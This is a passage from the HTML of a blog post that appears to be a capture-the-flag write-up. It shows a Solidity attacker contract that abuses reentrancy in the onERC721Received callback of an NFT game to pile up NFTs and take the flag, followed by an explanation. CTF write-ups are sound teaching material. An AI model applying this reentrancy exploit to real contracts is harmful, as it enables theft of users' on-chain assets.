</span></span><span style="display:flex;"><span>        <span style="color:#000">u2</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#204a87;font-weight:bold">new</span> <span style="color:#000">User</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">address</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">game</span><span style="color:#000;font-weight:bold">));</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#8f5902;font-style:italic">// Let user&#39;s join game.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#000">u1</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">joinGame</span><span style="color:#000;font-weight:bold">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">u2</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">joinGame</span><span style="color:#000;font-weight:bold">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#8f5902;font-style:italic">// Let user&#39;s NFTs put up for sale.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#000">u1</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">putUpForSale</span><span style="color:#000;font-weight:bold">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000">u2</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">putUpForSale</span><span style="color:#000;font-weight:bold">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#8f5902;font-style:italic">// Start attack.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#000">u1</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">attack</span><span style="color:#000;font-weight:bold">(</span><span style="color:#0000cf;font-weight:bold">0</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#0000cf;font-weight:bold">8</span><span style="color:#000;font-weight:bold">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8f5902;font-style:italic">// This function is being called during a swap we initiated with
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#8f5902;font-style:italic">// a `&lt;User&gt;.attack()` call.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#204a87;font-weight:bold">function</span> <span style="color:#000">onERC721Received</span><span style="color:#000;font-weight:bold">(</span>
</span></span><span style="display:flex;"><span>        <span style="color:#204a87;font-weight:bold">address</span> <span style="color:#000">operator</span><span style="color:#000;font-weight:bold">,</span>
</span></span><span style="display:flex;"><span>        <span style="color:#204a87;font-weight:bold">address</span> <span style="color:#204a87;font-weight:bold">from</span><span style="color:#000;font-weight:bold">,</span>
</span></span><span style="display:flex;"><span>        <span style="color:#204a87;font-weight:bold">uint256</span> <span style="color:#000">tokenId</span><span style="color:#000;font-weight:bold">,</span>
</span></span><span style="display:flex;"><span>        <span style="color:#204a87;font-weight:bold">bytes</span> <span style="color:#000">calldata</span> <span style="color:#204a87">data</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000;font-weight:bold">)</span> <span style="color:#204a87;font-weight:bold">external</span> <span style="color:#204a87;font-weight:bold">returns</span> <span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">bytes4</span><span style="color:#000;font-weight:bold">)</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#204a87;font-weight:bold">uint</span> <span style="color:#204a87">balance</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#000">game</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">balanceOf</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">address</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87">this</span><span style="color:#000;font-weight:bold">));</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#8f5902;font-style:italic">// During the fight we will lose 3 NFTs. In order to still have a
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#8f5902;font-style:italic">// higher balance than the current flagHolder, we need 7 NFTs.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#204a87;font-weight:bold">if</span> <span style="color:#000;font-weight:bold">(</span><span style="color:#204a87">balance</span> <span style="color:#ce5c00;font-weight:bold">==</span> <span style="color:#0000cf;font-weight:bold">4</span><span style="color:#000;font-weight:bold">)</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#8f5902;font-style:italic">// Continue with attack.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>            <span style="color:#000">u1</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">attack</span><span style="color:#000;font-weight:bold">(</span><span style="color:#0000cf;font-weight:bold">1</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#0000cf;font-weight:bold">6</span><span style="color:#000;font-weight:bold">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000;font-weight:bold">}</span> <span style="color:#204a87;font-weight:bold">else</span> <span style="color:#204a87;font-weight:bold">if</span> <span style="color:#000;font-weight:bold">(</span><span style="color:#204a87">balance</span> <span style="color:#ce5c00;font-weight:bold">==</span> <span style="color:#0000cf;font-weight:bold">5</span><span style="color:#000;font-weight:bold">)</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#8f5902;font-style:italic">// Continue with attack.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>            <span style="color:#000">u1</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">attack</span><span style="color:#000;font-weight:bold">(</span><span style="color:#0000cf;font-weight:bold">2</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#0000cf;font-weight:bold">7</span><span style="color:#000;font-weight:bold">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000;font-weight:bold">}</span> <span style="color:#204a87;font-weight:bold">else</span> <span style="color:#204a87;font-weight:bold">if</span> <span style="color:#000;font-weight:bold">(</span><span style="color:#204a87">balance</span> <span style="color:#ce5c00;font-weight:bold">==</span> <span style="color:#0000cf;font-weight:bold">6</span><span style="color:#000;font-weight:bold">)</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#8f5902;font-style:italic">// Continue with attack.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>            <span style="color:#000">u2</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">attack</span><span style="color:#000;font-weight:bold">(</span><span style="color:#0000cf;font-weight:bold">0</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#0000cf;font-weight:bold">9</span><span style="color:#000;font-weight:bold">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000;font-weight:bold">}</span> <span style="color:#204a87;font-weight:bold">else</span> <span style="color:#000;font-weight:bold">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#8f5902;font-style:italic">// Initiate fight...
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>            <span style="color:#000">game</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">fight</span><span style="color:#000;font-weight:bold">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#8f5902;font-style:italic">// ...and make sure we won.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>            <span style="color:#204a87">require</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">game</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">flagHolder</span><span style="color:#000;font-weight:bold">()</span> <span style="color:#ce5c00;font-weight:bold">==</span> <span style="color:#204a87;font-weight:bold">address</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87">this</span><span style="color:#000;font-weight:bold">));</span>
</span></span><span style="display:flex;"><span>        <span style="color:#000;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#8f5902;font-style:italic">// Afterwards return the correct function selector to make OZ&#39;s
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#8f5902;font-style:italic">// `_safeTransfer()` function pass.
</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#204a87;font-weight:bold">return</span> <span style="color:#000">IERC721Receiver</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">onERC721Received</span><span style="color:#000;font-weight:bold">.</span><span style="color:#204a87">selector</span><span style="color:#000;font-weight:bold">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#000;font-weight:bold">}</span>
</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">}</span>
</span></span></code></pre></div><p>The function <code>captureTheFlag()</code> initiates the attack. It marks their own <em>Mon</em>
NFTs as <code>upForSale</code> and sets up the two <code>User</code> contracts.
Lastly, it starts the attack by starting a swap with a user’s wallet and the
attacker’s one.</p>
<p>The attacker contract will then be called back via the <code>onERC721Received/4</code>
function, in which a next swap is initiated as long as the Mon NFT balance is
less than seven.</p>
<p>If the <em>Mon</em> NFT balance is sufficient, the <code>Gameefight()</code> function is called.</p>
<p>To make OZ’s <code>_safeTransfer/4</code> function pass after we won the game (remember,
all the NFT swaps are not yet fully executed), we return the expected function
selector.</p>
    
  </article>
  <div class="paginator">
    
    <a></a>
    
    
    <a class="link" href="http://garden.merkleplant.xyz/post/ampleforth-is-hayek-money/">next →</a>
    
  </div>
  <div class="comment">
    
    
    
    
    
    
  </div>
  
</main>

    <footer id="footer">
  <div>
    <span>© 2019</span> - <span>2022</span>
  </div>

  <div>
    <span>Powered by </span>
    <a class="link" href="https://gohugo.io/">Hugo</a>
    <span> 🍦 Theme </span>
    <a class="link" href="https://github.com/queensferryme/hugo-theme-texify">TeXify</a>
  </div>

  <div class="footnote">
    <span>Contact me on <a class=link href=https://twitter.com/merkleplant_eth>twitter</a>,
<a class=link href=https://github.com/pmerkleplant>github</a>, or via
<a class=link href="mailto:me@merkleplant.xyz">email</a> |
<a class=link href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh target=_blank rel=noopener>CC BY-NC-SA 4.0</a>
</span>
  </div>
</footer>

  </div>

  
  

  
  

  
  

</body>

</html>
